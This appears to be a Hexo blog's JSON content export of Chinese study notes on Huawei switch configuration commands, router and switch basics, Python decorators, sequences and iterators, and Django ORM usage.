{"meta":{"title":"Hexo","subtitle":"","description":"","author":"John Doe","url":"http://example.com","root":"/"},"pages":[],"posts":[{"title":"华为交换机学习","slug":"华为交换机学习","date":"2024-10-26T10:19:42.000Z","updated":"2024-10-26T10:28:16.892Z","comments":true,"path":"2024/10/26/华为交换机学习/","permalink":"http://example.com/2024/10/26/%E5%8D%8E%E4%B8%BA%E4%BA%A4%E6%8D%A2%E6%9C%BA%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"华为交换机基础命令用户模式 登陆设备后，直接进入用户模式，尖括号表示用户模式，在这个模式下只能执行少量查看配置的命令； 视图模式 用户模式下，输入system-view或者sys进入视图模式，方括号表示视图模式，可执行设备全局配置的命令； 进入接口 创建vlan并将端口加入vlan 1、创建vlan 创建单个vlan 批量创建vlan 2、更改端口的链接类型 由于华为交换机的端口出厂时默认都是hybrid类型或auto类型的，所以无法立即加入vlan，需要更改端口的link-type后，才可以加入vlan。单个端口更改方式如下： 为何要选择access类型？？ 因为我们是终端PC与交换机相连，要求PC只能只能和上级交换机通信，所以必须只属于1个vlan 以太网端口的链路类型有三种： Access 类型：端口只能属于1 个VLAN，一般用于交换机与终端用户之间的连接； Trunk 类型：端口可以属于多个VLAN，可以接收和发送多个VLAN 的报文，一般用于交换机 之间的连接； Hybrid 类型：端口可以属于多个VLAN，可以接收和发送多个VLAN 的报文，可以用于交换 机之间连接，也可以用于连接用户的计算机。Hybrid 端口可以允许多个VLAN 的报文发送时不携带标签，而Trunk 端口只允许缺省VLAN 的报文，发送时不携带标签。 trunk端口用于交换机相连，pvid必须一致。 access 类型只能属于1 个vlan 规模较大的企业局域网，不建议使用vlan1，所以trunk端口不允许vlan1通过 3、端口加入vlan 端口的批量操作——端口组 原理就是创建一个端口组，把要更改的端口加入到端口组中，然后统一更改类型加入vlan。也可以理解为群组端口，统一配置类型加入vlan. 批量更改，先更改端口类型，再统一加入某个vlan，如下： 5、vlan的查看 全局查看vlan信息 查看端口与vlan对应关系 1display port vlan 6、允许所有vlan通过 https://www.cnblogs.com/max-hou/p/16880547.html 用户视图登陆设备后，直接进入用户模式，只能执行少量查看配置的命令 1234Info: The max number of VTY users is 10, and the number of current VTY users on line is 1. The current login time is 2020-04-10 12:15:00+00:00.&lt;HUAWEI&gt; 系统视图用户模式下，输入system-view命令进入视图模式，可执行设备全局配置的命令 123&lt;ZD_agg_5720&gt;system-view Enter system view, return user view with Ctrl+Z.[ZD_agg_5720] 局部视图系统视图模式下，输入局部配置命令，进入局部对像的配置视图。如interface GE 1&#x2F;0&#x2F;0，进入GE1&#x2F;0&#x2F;0端口配置模式 1234&lt;ZD_agg_5720&gt;system-view Enter system view, return user view with Ctrl+Z.[ZD_agg_5720]interface GigabitEthernet 1/0/1[ZD_agg_5720-GigabitEthernet1/0/1] 常用命令命令简介 命令 缩写 解释 display dis 查看相应对象信息 undo 撤消或反向操作对应命令 system-view sy 进入系统视图 sysname 设置交换机名称 quit q 退出当前视图 reboot 交换机重启 reset restart 重新启动当前接口 shutdown 关闭当前接口 信息查看命令交换机信息查看12display version 查看交换机软件版本display clock 查看交换机时钟 交换机配置查看12display saved-configuration 显示系统保存配置display current-configuration 显示系统当前配置 当前对象信息查看123display this 显示当前信息。display this include-default 显示当前接口视图下的接口信息，包括默认值。display this interface 显示当前接口视图下的接口信息。 查看接口1234display interface 查看接口当前运行状态和接口统计信息display interface brief 查看接口状态和配置的简要信息。display interface description 查看指定接口的描述信息display interface vlanif 查看VLANIF接口的状态信息、配置信息和统计信息。 查看IP相关12345678display ip interface 查看接口与IP相关的配置和统计信息，包括接口接收和发送的报文数、字节数和组播报文数，以及接口接收、发送、转发和丢弃的广播报文数。display ip interface brief 看接口与IP相关的简要信息，包括IP地址、子网掩码、物理链路和协议的Up/Down状态以及处于不同状态的接口数目。display ip interface description 查看接口与IP相关的简要信息，包括IP地址、子网掩码、物理层状态、链路层协议状态，及接口描述信息和处于不同状态的接口数目。display ip pool 显示所有ip pooldisplay ip pool name &#123;pool name&#125; &#123;all|conflict|expired|used&#125; 显示ip pool详细信息display ip host 查看静态DNS表项display ip socket 查看已创建的IPv4 Socket信息。display ip statistics 显示IP流量统计信息。 查看路由1234display ip routing-table 显示路由信息display ospf peer 查看ospf邻接等信息display ospf peer brief 查看ospf邻接等简要信息display rip 查看rip路由信息 网络及流量123display network status &#123; all|tcp|udp|port port-number &#125; 显示IP流量统计信息 display tcp statistics 查看TCP流量统计信息display udp statistics 查看UDP流量统计信息 VLAN查看1234567display vlan 显示VLAN信息display vlan &#123;pvid&#125; verbose 查看vlan的详细信息display port vlan 查看VLAN中包含的接口信息display sub-vlan 查看Sub-VLAN类型的VLAN表项信息display super-vlan 查看Super-VLAN类型的VLAN表项信息display mac-vlan mac-address all 查看所有MAC地址划分VLAN的配置信息display mac-vlan vlan 2 查看vlan 2 MAC地址划分VLAN的配置信息 查看ACL配置12345678910display acl &#123;all | name | ipv6&#125; 查看ACLdisplay traffic classifier user-defined 查看用户定义的流分类display traffic behavior user-defined 查看用户定义的流行为display traffic policy user-defined &#123;policy name&#125; 查看用户定义的流策略display traffic-applied &#123;inbound | outbound | interface | vlan&#125; 查看流策略应用情况display traffic policy &#123;global | interface | statistics | vlan &#125; &#123;inbound | outbound&#125; 查看更多流策略信息display traffic policy statistics &#123;global | interface | vlan&#125; &#123;inbound | outbound&#125; 查看流策略统计信息display traffic-filter applied-record 查看acl应用的接口 查看NAT配置1234#路由器命令display nat static &#123;acl | global | inside | interface&#125; 查看静态NAT信息display nat session &#123;all | dest | number | protocol | source&#125; 查看动态NAT信息display nat server &#123;acl | global | inside | interface&#125; 查看NAT server信息 配置管理命令端口管理123456port 配置接口的缺省VLAN并加入该VLANport description 配置接口的描述信息，描述与接口相连的设备类型。port gigabitethernet 0/0/1 to 0/0/4port default vlan 配置接口的缺省VLAN并同时加入这个VLAN。port link-type &#123;access | hybird | trunk&#125; 配置接口的链路类型port trunk allow-pass vlan &#123;vlanid&#125; 将trunk接口加入vlan 端口配置12speed &#123;10|100|auto&#125; 配置端口工作速率duplex &#123;half|full|auto&#125; 配置端口工作状态 端口组操作123display port-group &#123;all&#125; 查看端口组port-group &#123;id&#125; 创建端口组group-member gigabitethernet 0/0/2 to gigabitethernet 0/0/10 将2到10端口加入端口组 VLAN管理123456vlan &#123;id&#125; 创建VLAN并进入VLAN视图，如果VLAN已存在，直接进入该VLAN的视图。vlan batch 10 to 20 批量创建VLANvlan range 10 to 20 创建临时VLAN组，并进入VLAN-Range视图vlan statistics 配置VLAN的流量统计模式，即配置按包或按字节进行VLAN流量统计。vlan statistics interval 配置VLAN的流量统计的时间间隔ip address 用来配置接口的IP地址。 接口管理1interface gigabitethernet 0/0/1 进入指定的接口或子接口视图，进入0/0/1的接口 DNS管理123456789#查看display dns dynamic-host 查看动态DNS表项display dns domain 查看域名后缀的相关信息display dns server 查看DNS服务器的相关信息#设置dns domain domain-name 命令用来配置域名后缀，如 dns domain com.cn。dns resolve 命令用来使能动态域名解析功能dns server &#123;ip&#125; 命令用来配置DNS服务器的IP地址ip host &#123;domain&#125; &#123;ip&#125; 命令用来配置静态DNS表项 ip host www.huawei.com 10.10.10.4。 DHCP管理12dhcp enable 命令用来开启DHCP功能。 dhcp select global 从全局配置中获取dhcp配置 ACL管理123456789101112131415161718acl &#123;name | number | ipv6&#125; 创建aclrule [&#123;ruleid&#125;] permit ip source &#123;源ip&#125; &#123;反掩码&#125; [ destination &#123;源ip&#125; &#123;反掩码&#125; ] 创建允许规则rule [&#123;ruleid&#125;] deny ip source &#123;源ip&#125; &#123;反掩码&#125; [ destination &#123;源ip&#125; &#123;反掩码&#125; ] 创建拒绝规则traffic-filter &#123;inbound | outbound&#125; acl &#123;acl number&#125; 在接口上应用acl规则#创建流分类traffic classifier &#123;classifier name&#125; operator &#123; and |or &#125;if-match acl &#123;acl number&#125; 为流分类设置匹配规则#创建流行为traffic behavior &#123;behavior name&#125; permit | deny | redirect 为流行为配置动作#创建流策略traffic policy &#123;policy name&#125; classifier &#123;classifier name&#125; behavior &#123;behavior name&#125; 关联流分类与流行为#将流策略应用到接口interface g0/0/1traffic-policy &#123;policy name&#125; &#123;inbound | outbound&#125; 接口绑定流策略 NAT管理123456789#边界路由器接口上配置静态NATnat static global &#123;外部ip&#125; inside &#123;内部ip&#125; 添加静态nat，内外部ip一对一#动态NAT，使用dis nat session查看nat address-group &#123;groupid&#125; &#123;ip开始&#125; &#123;ip结束&#125; 添加外部可用地址池nat outbound &#123;acl id&#125; address-group &#123;address-group id&#125; no-pat 添加动态地址转换#NAPT，使用dis nat session查看nat outbound &#123;acl id&#125; [address-group &#123;address-group id&#125;] 添加动态端口地址转换#NAT server，使用dis nat server查看nat server protocol tcp global &#123;外部ip&#125; &#123;外部端口&#125; inside &#123;内部ip&#125; &#123;内部端口&#125; 添加nat server转换 用户管理123456789101112#查看本地用户display local-user#查看用户接口display user-interface#设置用户vty0为4个并发user-interface vty 0 4#进入用户console0接口user-interface console 0#用户管理local-user &#123;username&#125; password cipher &#123;password&#125;local-user &#123;username&#125; level 15local-user &#123;username&#125; service-type telnet terminal ssh 绑定IP与MAC12user-bind ip-address 10.0.0.2 mac-address 0001-0203-0405user privilege level 3 LEVEL 0(访问级)：可以执行用于网络诊断等功能的命令。包括ping、tracert、telnet等命令，执行该级别命令的结果不能被保存到配置文件中。LEVEL 1(监控级)：可以执行用于系统维护、业务故障诊断等功能的命令。包括debugging、terminal等命令，执行该级别命令的结果不能被保存到配置文件中。LEVEL 2(系统级)：可以执行用于业务配置的命令，主要包括路由等网络层次的命令，用于向用户提供网络服务。LEVEL 3(管理级)：最高级，可以运行所有命令：关系到系统的基本运行、系统支撑模块功能的命令，这些命令对业务提供支撑作用。包括文件系统、FTP、TFTP、XModem下载、用户管理命令、级别设置命令等。 日志与统计12345#打开统计display counters 查看接口的流量统计计数statistic enabletrace mac enabletrace mac aa99-6600-5600 vlan 2 其它命令12345678display stp 显示生成树信息display mac-address 显示MAC地址表display bridge mac-address 查看当前桥接设备mac地址display arp 显示ARP信息表display voice-vlan oui 查看Voice VLAN的OUI及其相关属性。display voice-vlan status 查看当前Voice VLAN的相关信息mac-vlan mac-address 操作实战VLAN操作创建vlan，设置vlan的ip，并将端口加入vlan中。 123456789101112131415161718192021#进入全局配置视图&lt;Huawei&gt; system-view#新建vlan2[Huawei] vlan 2#进入vlan2的接口视图[Huawei] interface vlan 2#设置vlan2的三层网关路由[Huawei-Vlanif2] ip address 10.0.0.1 255.255.255.0#进入0/0/1接口，配置为access接口并加入vlan2中[Huawei] interface GigabitEthernet 0/0/1[Huawei-GigabitEthernet0/0/1] port link-type access[Huawei-GigabitEthernet0/0/1] port default vlan 2#进入0/0/2接口，配置为trunk接口并加入vlan2中[Huawei] interface GigabitEthernet 0/0/2[Huawei-GigabitEthernet0/0/2] port link-type trunk[Huawei-GigabitEthernet0/0/2] port trunk allow-pass vlan 2#查看端口配置的信息[Huawei-GigabitEthernet0/0/2] dis this#进入vlan2，将0/0/2到0/0/5端口加入到vlan2中（port link-type需要是access类型）[Huawei] vlan 2[Huawei-vlan2] port GigabitEthernet 0/0/2 to 0/0/5 端口组操作需要对多个端口进行相同操作时，可以创建端口组进行批量操作。 12345678#创建端口组1，进行批量端口操作[Huawei] port-group 1#将6到10端口加入端口组[Huawei-port-group-1] group-member gigabitethernet 0/0/6 to gigabitethernet 0/0/10#批量将2~10端口修改为access模式[Huawei-port-group-1] port link-type access#批量将6~10端口加入到vlan 2中[Huawei-port-group-1] port default vlan 2 IP POOL操作1234567891011&lt;Huawei&gt; system-view#进入ip pool中[Huawei] ip pool vlan10#在ip pool中添加dns server[Huawei-ip-pool-vlan10] dns-list 8.8.8.8#设置网关[Huawei-ip-pool-vlan10] gateway-list 10.0.0.1#设置ip pool的ip段和池，需要与vlanif接口配置匹配，否则ip分配不了[Huawei-ip-pool-vlan10] network 10.0.0.0 mask 255.255.255.0#过期时间[Huawei-ip-pool-vlan10] lease day 10 DHCP操作123456789&lt;Huawei&gt; system-view#全局打开DHCP服务[Huawei] dhcp enable#进入vlan的接口视图[Huawei] interface vlanif 2#设置vlan2的三层网关路由[Huawei-Vlanif2] ip address 10.0.0.1 255.255.255.0#从全局配置中获取dhcp配置[Huawei-Vlanif2] dhcp select global 静态添加路由123456&lt;Huawei&gt; system-view&lt;Huawei&gt; display ip routing-table#ip route-static 目的ip 目标地址掩码 下一跳ip[Huawei] ip route-static 10.0.1.0 255.255.255.0 10.0.0.1#删除路由[Huawei] undo ip route-static 10.0.1.0 255.255.255.0 10.0.0.1 RIP路由管理1234567891011&lt;Huawei&gt; system-view#修改loopback0地址[Huawei] int LoopBack 0[Huawei-LoopBack0] ip address 1.1.1.1 0#创建rip进程[Huawei] rip 1#启动版本2[Huawei-rip-1] version 2#宣告网段[Huawei] network 10.0.0.0[Huawei] network 1.0.0.0 OSPF路由管理12345678910111213&lt;Huawei&gt; system-view#创建ospf[Huawei] ospf 1 router-id 1.1.1.1#创建area0区域[Huawei-ospf-1] area 0#加入192.168.0.0/24子网[Huawei-ospf-1-area-0.0.0.0] network 192.168.0.0 0.0.0.255[Huawei-ospf-1-area-0.0.0.0]dis this# area 0.0.0.0 network 192.168.0.0 0.0.0.255#[Huawei-ospf-1-area-0.0.0.0] ACL管理12345678910111213141516171819202122&lt;Huawei&gt; system-view#配置acl[Huawei] acl 3000[Huawei-acl-adv-3000] rule permit ip source 192.168.1.0 0.0.0.255 destination 192.168.2.0 0.0.0.255[Huawei-acl-adv-3000] rule permit ip source 192.168.2.0 0.0.0.255[Huawei-acl-adv-3000] quit#配置流分类，匹配acl[Huawei] traffic classifier c0 operator or [Huawei-classifier-c0] if-match acl 3000[Huawei-classifier-c0] quit#配置流行为,设置动作[Huawei-behavior-b0] traffic behavior b0[Huawei-behavior-b0] permit[Huawei-behavior-b0] quit#配置流策略，关联流分类c0与流行为b0[Huawei] traffic policy p0[Huawei-trafficpolicy-p1] classifier c0 behavior b0[Huawei-trafficpolicy-p1] quit#配置流策略应用到接口[Huawei] interface g0/0/1[Huawei-GigabitEthernet0/0/1] traffic-policy p0 inbound[Huawei-GigabitEthernet0/0/1] return 用户管理1234567891011#查看本地用户&lt;Huawei&gt; display local-user&lt;Huawei&gt; system-view#进入aaa配置模式[Huawei] aaa#配置本地用户账号密码[Huawei-aaa] loca-user user1 password cipher 123456#用户服务类型为telnet，使用telnet登陆[Huawei-aaa] local-user user1 service-type telnet#配置用户特权等级15[Huawei-aaa] local-user user1 privilege level 15","categories":[],"tags":[{"name":"华为交换机","slug":"华为交换机","permalink":"http://example.com/tags/%E5%8D%8E%E4%B8%BA%E4%BA%A4%E6%8D%A2%E6%9C%BA/"}]},{"title":"路由器与交换机学习","slug":"路由器与交换机学习","date":"2024-10-25T03:53:28.000Z","updated":"2024-10-25T04:09:33.954Z","comments":true,"path":"2024/10/25/路由器与交换机学习/","permalink":"http://example.com/2024/10/25/%E8%B7%AF%E7%94%B1%E5%99%A8%E4%B8%8E%E4%BA%A4%E6%8D%A2%E6%9C%BA%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"OSI模型 物理层-&gt;数据链路层-&gt;网络层-&gt;传输层-&gt;会话层-&gt;表示层-&gt;应用层 路由器工作在网络层,主要是根据ip地址寻址,路由器可以处理TCP&#x2F;IP协议 交换机根据MAC地址寻址,数据链路层 路由器可以把一个IP分配给很多个主机使用，这些主机对外只表现出一个IP。交换机可以把很多主机连起来，这些主机对外各有各的IP。 三层交换机同样可以有路由的功能，而且比低端路由器的转发速率更快。三层交换机就是具有部分路由器功能的交换机，工作在OSI网络标准模型的第三层：网络层。 一次路由，多次转发。 VLAN即虚拟局域网，是一种通过将局域网内的设备逻辑地而 不是物理地划分成一个个网段从而实现虚拟工作组的新兴技术。 VLAN 在交换机上的实现方法，可以大致划分为 2 大类：1）基于端口划分的静态 VLAN；2） 基于 MAC 地址|IP 等划分的动态 VLAN；当前主要是静态 VLAN 的实现。 ARP 的解析过程。ARP 用于把一个已知的 IP 地址解析成 MAC 地址，以便在 MAC 层通信。 为了确定目标的 MAC 地址，首先查找 ARP 缓存表。 如果要查找的 MAC 地址不在表中，ARP 会发送一个广 播，从而发现目的地的 MAC 地址，并记录到 ARP 缓存表中以便下次查找。","categories":[],"tags":[{"name":"路由器;交换机","slug":"路由器-交换机","permalink":"http://example.com/tags/%E8%B7%AF%E7%94%B1%E5%99%A8-%E4%BA%A4%E6%8D%A2%E6%9C%BA/"}]},{"title":"","slug":"专题04 装饰器","date":"2024-10-24T11:20:58.414Z","updated":"2024-10-07T05:20:46.953Z","comments":true,"path":"2024/10/24/专题04 装饰器/","permalink":"http://example.com/2024/10/24/%E4%B8%93%E9%A2%9804%20%E8%A3%85%E9%A5%B0%E5%99%A8/","excerpt":"","text":"装饰器一、概念1234567891. 装饰器（Decoration）: - 装饰器是一种设计模式，经常用来实现&quot;面向切面的编程&quot;(AOP: 实现在不修改源代码的情况下，给程序动态添加功能的一种技术) 2. 装饰器的作用： - 装饰器允许向一个现有的对象(函数)添加新的功能，同时又不改变其结构 - 可以抽离出大量的函数中的和业务无关的功能 3. 应用场景： - 插入日志、性能测试、事务处理、缓存、中间件、权限控制等 举个栗子：现在需要计算某个函数的执行时间 123456789101112131415161718192021222324252627import timedef fun1(): start = time.time() s = 0 for i in range(1, 100001): s += i print(f&#x27;和为：&#123;s&#125;&#x27;) t = time.time() - start print(f&#x27;函数的执行时间为:&#123;t:.10f&#125;&#x27;)fun1()def fun2(): start = time.time() s = 1 for i in range(1, 100001): s *= i print(f&#x27;乘积为：&#123;s&#125;&#x27;) t = time.time() - start print(f&#x27;函数的执行时间为:&#123;t:.10f&#125;&#x27;)fun2() 如果要把计算时间的代码抽离出来，此时就可以使用装饰器来实现 1234567891011121314151617import timedef get_time(func): def wrapper(): start = time.time() func() t = time.time() - start print(f&#x27;函数的执行时间为：&#123;t&#125;&#x27;) return wrapper @get_time def fun2(): s = 1 for i in range(1, 100001): s *= i print(f&#x27;乘积为：&#123;s&#125;&#x27;)fun2() 二、装饰器详解1、装饰器1234装饰器：1. 关键字：@，在被修饰的函数的前一行加入2. 本质：装饰器的本质就是一个函数3. 原理：在调用被装饰的函数时，被装饰的函数体的代码并不会被直接执行。而是在调用被装饰的函数时，将该函数传递给装饰器 2、装饰器的基本形式并不是真正的装饰器（有问题） 12345678910111213141516171819202122# 装饰器函数必须要有一个参数，来接收被装饰的函数(名)def my_decoration(func): #print(&#x27;这里写要装饰的东西，要给被装饰的函数添加的功能&#x27;) print(&#x27;*&#x27;*10,&#x27;我是华丽丽的分隔线&#x27;,&#x27;*&#x27;*10) return func@my_decorationdef f(): print(&#x27;这是一个函数&#x27;)# 这里调用被装饰的函数时，实际上先调用了装饰器，将函数本身# 传递给装饰器函数，然后执行装饰器函数内部的代码f()@my_decorationdef f2(): print(&#x27;这是另一个函数&#x27;)f2() 3、装饰器-内嵌函数并不是真正的装饰器 123456789101112def my_decoration(func): def wrapper(): # 这里和上述的基本形式本质上是一样 print(&#x27;这是要装饰的内容&#x27;) wrapper() return func@my_decorationdef f2(): print(&#x27;这是另一个函数&#x27;)f2() 4、装饰器-闭包函数1234567891011121314def my_decoration(func): def wrapper(): print(&#x27;\\n&#x27;+&#x27;*&#x27;*10,&#x27;start&#x27;,&#x27;*&#x27;*10) func() # 这是调用被装饰的函数 print(&#x27;*&#x27;*11,&#x27;end&#x27;,&#x27;*&#x27;*11,&#x27;\\n&#x27;) return wrapper@my_decorationdef f(): print(&#x27;这是另一个函数&#x27;)f() 5、装饰器闭包原理剖析12345678# 闭包：内函数引用了外函数的局部变量，并且外函数返回了内函数对象本身def outer(x): def inner(): return x return innerot = outer(&#x27;哈哈哈&#x27;)print(ot()) 12345678910111213# 在上述的代码中，给外函数传递的是一个字符串类型的参数，其实也可给外函数传递一个函数对象def outer(x): def inner(): x() # 这里实际是调用了f1()函数 return innerdef f1(): print(&#x27;这是f1函数&#x27;)ot = outer(f1)ot() 12345678910111213141516171819# @语法糖def outer(func): def inner(): print(1111111111) func() # 这里实际是调用了f1()函数 print(22222222) return inner# def f1():# print(&#x27;这是f1函数&#x27;)# ot = outer(f1) # 1. 这是闭包的调用语法# ot()@outer # 2. 这是Python的装饰器的语法糖def f2(): print(&#x27;这是f2函数&#x27;)f2() 三、带参数的装饰器1之前实现的装饰器，给被装饰的函数添加的都是相同的功能，如果希望这个装饰对不同的函数作出不同的响应，此时就需要给装饰器传参数，在装饰器的内部根据参数的不同，作出不同的操作 12345678910111213141516171819202122232425def my_decoration(a): def wrapper(func): def inner(): if a &lt; 10: print(1111) else: print(2222) func() return inner return wrapper@my_decoration(a=5)def f1(): print(&#x27;这是第一个函数&#x27;)f1()@my_decoration(a=20)def f2(): print(&#x27;这是第二个函数&#x27;)f2() 四、类装饰器1装饰器不一定只能用函数来实现，也可以使用类来装饰，用法与函数装饰器区别不大，实质上是调用了类方法中__call__魔法方法 12345678910111213141516class logging: def __init__(self, func): print(&#x27;__init__&#x27;,func) self.__func = func def __call__(self): print(1111111) return self.__func()@loggingdef hello(): print(&#x27;hello 你好呀&#x27;)hello() # 调用了类装饰器中魔法方法 __call__ 敲敲就会了 五、内置装饰器Python语言本身也有一些装饰器，比如@property 1234567class Person: def __init__(self,name,age): self.name = name self.age = age gou = Person(&#x27;二狗&#x27;,18)gou.age = 20 # 1. 属性暴露 2. 可以外界随意更改 修改： 12345678910111213141516171819202122class Person: def __init__(self, name, age): self.__name = name self.__age = age def set_age(self, age): if isinstance(age, int): if 0 &lt; age &lt; 100: self.__age = age else: raise ValueError(&#x27;年龄超出范围&#x27;) else: raise TypeError(&#x27;年龄类型错误&#x27;) def get_age(self): return self.__agegou = Person(&#x27;二狗&#x27;, 18)gou.set_age(&#x27;abc&#x27;) # TypeError: 年龄类型错误print(gou.get_age()) 再次修改： 12345678class Person: 同上.... age = property(fget=get_age, fset=set_age)gou = Person(&#x27;二狗&#x27;, 18)gou.age = 200 # ValueError: 年龄超出范围print(gou.age) @property12345678910111213141516171819# 使类中的方法可以像属性一样调用class Person: def __init__(self, name, age): self.__name = name self.__age = age @property def age(self): return self.__age @age.setter def age(self,a): self.__age = agou = Person(&#x27;二狗&#x27;, 18)gou.age = 20 # 调用 setterprint(gou.age) # 调用 property @staticmethod将类中的方法设置为静态方法，它不需要创建实例对象，就可以使用类名来调用 1234567891011121314class Person: x = 100 xxxxxx...... 其它代码自己补 @staticmethod def f(): print(Person.x) # 有一个方法不需要去访问实例属性 print(&#x27;静态方法&#x27;)Person.f() # 可以直接用类名调用p = Person(&#x27;Tom&#x27;,18)p.f() # 也可以用对象调用 @classmethod1234567891011121314151617class Person: xxxxxxxxxxxxx.............. @staticmethod def f(): print(Person.x) print(&#x27;静态方法&#x27;) @classmethod def n(cls): # 不用写类名 这里的cls就是类名 print(cls,type(cls)) print(isinstance(cls,Person)) print(cls.x)Person.n()p = Person(&#x27;Tom&#x27;,18)p.n()","categories":[],"tags":[]},{"title":"","slug":"专题02-序列","date":"2024-10-24T11:20:58.410Z","updated":"2024-10-07T05:20:47.003Z","comments":true,"path":"2024/10/24/专题02-序列/","permalink":"http://example.com/2024/10/24/%E4%B8%93%E9%A2%9802-%E5%BA%8F%E5%88%97/","excerpt":"","text":"序列（Sequence）一、概念1234567891. 序列并不是Python自带（内置）的一种数据类型2. 序列是一块可存放多个值的连续内存空间，这些值在内存中是按一定的顺序排列，可以通过每个值所在的位置进行编号（索引.从0开始）并来访问3. 列表、元组、字符串4. 支持下标访问5. 支持切片访问 二、常用的函数1234567891011121314151617181920212223242526272829303132333435363738391. list(iterable) 将可迭代对象转为列表 2. tuple(iterable) 将可迭代对象转为元组 3. str(iterable) 将可迭代对象转为字符串 4. len(obj) 返回对象的长度 -- obj一般是指Python中的容器 5. max(arg1,arg2...) 或 max(iterable) print(max(2,3,1)) print(max([2,3,1])) 返回参数中最大值 6. min() 返回参数中最小值，同max 7. sum(iterable,start=0) 返回可迭代对象的总和 print(sum([2,3,5])) print(sum([i for i in range(1,101)])) 8. sorted(iterable, key=None, reverse=False) 对可迭代对象进行升序排列 reverse为True时为降序9. reversed(sequence) 反转序列，返回一个迭代器对象 10. enumerate(iterable[, start]) 返回一个枚举对象 它也是一个可迭代对象 它的每一个元素都是元组（index,value） for index,value in enumerate([2,4,6,8,22]): print(f&quot;第&#123;index+1&#125;个元素是&#123;value&#125;&quot;) 11. zip(iter1 [,iter2 [...]]) --&gt; zip object 打包可迭代对象的相同下标的元素为一个元组 如果缺少对应下标，则不打包，不会生成该下标对应的元组","categories":[],"tags":[]},{"title":"","slug":"专题01-容器、可迭代对象、迭代器、生成器","date":"2024-10-24T11:20:58.408Z","updated":"2024-10-07T05:20:47.034Z","comments":true,"path":"2024/10/24/专题01-容器、可迭代对象、迭代器、生成器/","permalink":"http://example.com/2024/10/24/%E4%B8%93%E9%A2%9801-%E5%AE%B9%E5%99%A8%E3%80%81%E5%8F%AF%E8%BF%AD%E4%BB%A3%E5%AF%B9%E8%B1%A1%E3%80%81%E8%BF%AD%E4%BB%A3%E5%99%A8%E3%80%81%E7%94%9F%E6%88%90%E5%99%A8/","excerpt":"","text":"容器、可迭代对象、迭代器、生成器一、容器123456789101112# 容器（Container）1. 容器是一种把多个元素组成在一起的一种数据结构2. 容器中的元素是可以逐个迭代获取（Python自带）3. 可以使用成员关系操作符来判断元素是否在容器中 in / not in4. 容器在Python中并不是一个真实存在的类型，它是抽象的概念，不能直接实例化一个Container对象5. Python中常见的容器类型： list、tuple、dict、str、set、frozenset 二、可迭代对象12345678910# 可迭代对象（iterable）1. 很多容器都是可迭代对象 - for i in 对象： 该对象就是一个可迭代对象 - 实现__iter__方法 2. 可以使用iter(iterable)返回一个迭代器 - 一个对象可迭代的本质是 通过迭代器来实现的 l = [2,4,6,8,22] iterator = iter(l) 三、迭代器1234567891011121314151617181920# 迭代器（iterator）1. iter(可迭代对象)可以返回这个对象的迭代器2. 任何实现了__iter__和__next__方法的对象都是迭代器对象 迭代器如何实现迭代元素操作： l = [2,4,6,8,22] iterator = iter(l) # 获取迭代器 next(iterator) / iterator.__next__() # 获取下一个元素 迭代器获取可迭代对象中的元素是使用了__next__方法 3. 迭代器对象是一个带状态的对象 __index记录当前迭代的位置 4. 迭代器也是一个可迭代对象， 而可迭代对象不一定是一个迭代器（next） for i in l: # l-&gt;iterator-&gt;next print(i) for i in iterator: # iterator-&gt;next print(i) 12345678910# for循环底层实现for i in [2,4,6,8,22]: print(i) 1. 先获取in后面的可迭代对象的迭代器 iter(in后面的对象) 或 In后面的对象.__iter__ 2. 使用上面1中获取到的迭代器，再调用它的__next__方法来返回可迭代对象中的元素 __next__ 底层有一个__index下标来记录当前迭代的位置 再return 可迭代对象[__index] 123456789101112131415161718192021222324252627# 自定义实现一个迭代器class Stack: def __init__(self,*args): self.__items = list(args) self.__index = 0 def __iter__(self): return self def __next__(self): if self.__index &lt; len(self.__items): item = self.__items[self.__index] self.__index += 1 return item else: raise StopIterations = Stack(1,2,3,4)for item in s: print(item)iterator = iter(s)print(next(iter(iterator)))print(next(iter(iterator)))print(next(iter(iterator)))print(next(iter(iterator)))print(next(iter(iterator))) 四、生成器12345678910111213141516171819202122232425# 生成器（generator）a. 生成一个列表，列表中的所有元素都会存内存中，如果列表中的元素比较多，会大量占用内存空间，如果列表的后续元素可以按照某种算法推算出来，此时就可以使用生成器来完成b. 生成器是一个特殊的迭代器 所以可以next(生成器)来获取下一个元素 l = [i for i in range(100)]1. 列表推导式将[]改为()g = (i for i in range(100)) # 返回了生成器2. yield关键字如果一个函数中包含了yield关键字，此时该函数就不再是一个普通的函数，而是一个生成器，调用函数在本质是构造了一个生成器def getNumber(): print(&#x27;aaaaaaaaaaa&#x27;) for i in range(5): print(&#x27;bbbbbbb&#x27;) yield i # yield相当于return返回了一个值，并且它会记住这个代码的位置，下一次迭代时，代码从上一次的位置继续执行n = getNumber()print(n)print(next(n))print(next(n))","categories":[],"tags":[]},{"title":"","slug":"回顾总结","date":"2024-10-24T11:20:58.406Z","updated":"2024-10-07T05:20:46.922Z","comments":true,"path":"2024/10/24/回顾总结/","permalink":"http://example.com/2024/10/24/%E5%9B%9E%E9%A1%BE%E6%80%BB%E7%BB%93/","excerpt":"","text":"orm 123一个class -&gt; 一张表一个model对象-&gt; 一行数据一个属性-&gt;一列数据 model层开发流程 1234567创建app挂载appsettings.py 配置数据库 引擎 ....键值对去app下的models文件 书写model类(属性对应的是列名,值是models.对象) float-&gt;double text-&gt;longtext char-&gt;varchar Bloon-&gt;tinyint 生成迁移记录 python manage.py makemigrations 执行迁移 python manage.py migrate 元数据 1234在model类中再定义一个类 Meta db_table=&#x27;新表名&#x27; unique_together=&#x27;元祖&#x27;或者二维元祖 ordering=[&#x27;name&#x27;] 降序:- 字段参数 1234null=True 可以为空defualt=&#x27;hehe&#x27; 默认 不可以作用于数据库db_index=True 添加索引unique=True 设置为唯一 增 12341. 创建model对象 User(参数) model对象要.save()2. 使用queryset的create()创建 User.objects.create(参数) 删除 1231. 获取到model对象 user = User.objects.get(pk=1).delete() user = User.objects.filter(pk=1)[0].delete() 修改 12341. 获取到model对象 user = User.objects.get(pk=1) user.name = &#x27;sun&#x27; user.save() 查询 123456789101112131415161718192021221. 所有的查询操作(调用方法)都是queryset对象调用的2. 查询方法 1.get() -&gt; 只能返回一条数据(否则报错) 一个model对象 2.all() -&gt; 返回所有数据 一个queryset对象 里面盛放所有的model对象 3.filter() -&gt; 一个queryset对象 如果没有查到数据 返回一个空queryset 4.exclude() -&gt; 与filter相反 5.count() -&gt; int 返回的查询结果的条目数 6.values() -&gt; 一个queryset对象 每一行数据都是一个字典 